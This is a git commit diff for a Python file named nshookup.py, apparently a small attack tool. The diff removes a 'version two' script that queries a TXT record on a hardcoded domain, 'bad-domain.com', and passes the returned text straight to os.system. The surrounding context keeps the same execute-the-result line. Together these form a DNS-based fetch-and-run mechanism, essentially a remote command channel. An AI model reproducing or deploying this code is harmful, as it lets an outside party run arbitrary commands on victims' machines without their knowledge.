964900b7f48bc2401ae533b308a45926387cfafb
Dood3 <93183445+Dood3@users.noreply.github.com>
2025-02-16 12:29:18 +0100

    Update nshookup.py

--- nshookup_SRC/nshookup.py
+++ nshookup_SRC/nshookup.py
@@ -13,20 +13,3 @@ for cmdval in result:
 
 os.system(result)
 Version two with hardcoded domain:
-Command: python nshookup.py
-
-#===========================================================
-
-#!/usr/bin/python3
-
-import os, sys
-import dns.resolver
-
-result = dns.resolver.resolve('bad-domain.com', 'TXT')
-
-for cmdval in result:
-  
-  text = cmdval.to_text()
-  result = text.split('"')[1].split('"')[0]
-
-os.system(result)
